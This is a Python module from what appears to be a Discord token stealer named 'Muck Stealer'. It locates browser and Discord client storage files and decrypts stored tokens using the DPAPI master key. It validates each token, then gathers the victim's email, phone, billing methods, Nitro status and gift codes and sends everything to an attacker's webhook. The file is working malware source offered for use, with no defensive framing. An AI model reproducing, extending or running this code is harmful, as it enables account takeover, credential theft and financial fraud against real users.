import os
import re
import json
import base64
import urllib.request
from stealer.core import DecryptValue, CryptUnprotectData, LoadUrlib
from core.config import WEBHOOK_URL

def getCodes(token):
    try:
        codes = ""
        headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
        req = urllib.request.Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)
        codess = json.loads(urllib.request.urlopen(req).read().decode())
        for code in codess:
            try:
                codes += f":tickets: **{code['promotion']['outbound_title']}**\n`{code['code']}`\n"
            except:
                pass
        req2 = urllib.request.Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers)
        nitrocodess = json.loads(urllib.request.urlopen(req2).read().decode())
        for element in nitrocodess:
            sku_id = element['sku_id']
            sub_id = element['subscription_plan']['id']
            name = element['subscription_plan']['name']
            url2 = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={sub_id}"
            req3 = urllib.request.Request(url2, headers=headers)
            nitrrrro = json.loads(urllib.request.urlopen(req3).read().decode())
            for el in nitrrrro:
                codes += f":tickets: **{name}**\n`https://discord.gift/{el['code']}`\n"
        return codes
    except:
        return ""

def GetBilling(token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    try:
        req = urllib.request.Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)
        billingjson = json.loads(urllib.request.urlopen(req).read().decode())
    except:
        return False
    if not billingjson:
        return " -"
    billing = ""
    for m in billingjson:
        if not m["invalid"]:
            if m["type"] == 1:
                billing += ":credit_card:"
            elif m["type"] == 2:
                billing += ":parking: "
    return billing

def GetBadge(flags):
    if flags == 0:
        return ''
    OwnedBadges = ''
    badgeList = [
        (4194304, '<:active:1045283132796063794> '),
        (131072, "<:developer:874750808472825986> "),
        (16384, "<:bughunter_2:874750808430874664> "),
        (512, "<:early_supporter:874750808414113823> "),
        (256, "<:balance:874750808267292683> "),
        (128, "<:brilliance:874750808338608199> "),
        (64, "<:bravery:874750808388952075> "),
        (8, "<:bughunter_1:874750808426692658> "),
        (4, "<:hypesquad_events:874750808594477056> "),
        (2, "<:partner:874750808678354964> "),
        (1, "<:staff:874750808728666152> ")
    ]
    for val, emoji in badgeList:
        if flags // val != 0:
            OwnedBadges += emoji
            flags %= val
    return OwnedBadges

def getbillq(token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    billq = "`(LQ Billing)`"
    try:
        req = urllib.request.Request("https://discord.com/api/v9/users/@me/billing/payments?limit=20", headers=headers)
        bill = json.loads(urllib.request.urlopen(req).read().decode())
        if bill and bill[0]['status'] == 1:
            billq = "`(HQ Billing)`"
    except:
        pass
    return billq

def GetTokenInfo(token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    req = urllib.request.Request("https://discordapp.com/api/v6/users/@me", headers=headers)
    userjson = json.loads(urllib.request.urlopen(req).read().decode())
    username = userjson["username"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"
    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson and userjson["phone"]:
        phone = f'`{userjson["phone"]}`'
    return username, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    try:
        req = urllib.request.Request("https://discordapp.com/api/v6/users/@me", headers=headers)
        urllib.request.urlopen(req)
        return True
    except:
        return False

def uploadToken(token, path):
    username, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp else "https://i.imgur.com/Npe8QuD.png"
    billing = GetBilling(token)
    badge = GetBadge(flags)
    billq = getbillq(token)
    data = {
        "content": "Muck Stealer",
        "embeds": [{
            "fields": [
                {"name": "Token:", "value": f"`{token}`"},
                {"name": "Mail:", "value": f"`{email}`", "inline": False},
                {"name": "Phone:", "value": phone, "inline": False},
                {"name": "IP:", "value": "To be filled", "inline": False},
                {"name": "Badges:", "value": nitro + badge, "inline": False},
                {"name": "Billing:", "value": f"{billing} {billq}", "inline": False},
            ],
            "author": {"name": username, "icon_url": pfp},
            "footer": {"text": "Muck Stealer"},
            "thumbnail": {"url": pfp}
        }]
    }
    LoadUrlib(WEBHOOK_URL, data=json.dumps(data).encode(), headers={"Content-Type": "application/json"})

def getTokenFromBrowser(path, arg, TokensList):
    if not os.path.exists(path):
        return
    path += arg
    for file in os.listdir(path):
        if file.endswith((".log", ".ldb")):
            with open(f"{path}\\{file}", "r", errors="ignore") as f:
                for line in f.readlines():
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        if checkToken(token):
                            if token not in TokensList:
                                TokensList.append(token)
                                uploadToken(token, path)

def GetDiscordTokenFromClient(path, arg, TokensList):
    if not os.path.exists(f"{path}/Local State"):
        return
    pathC = path + arg
    with open(path + "/Local State", 'r', encoding='utf-8') as f:
        local_state = json.loads(f.read())
    master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    for file in os.listdir(pathC):
        if file.endswith((".log", ".ldb")):
            with open(f"{pathC}\\{file}", "r", errors="ignore") as f:
                for line in f.readlines():
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokenDecoded = DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if checkToken(tokenDecoded) and tokenDecoded not in TokensList:
                            TokensList.append(tokenDecoded)
                            uploadToken(tokenDecoded, path)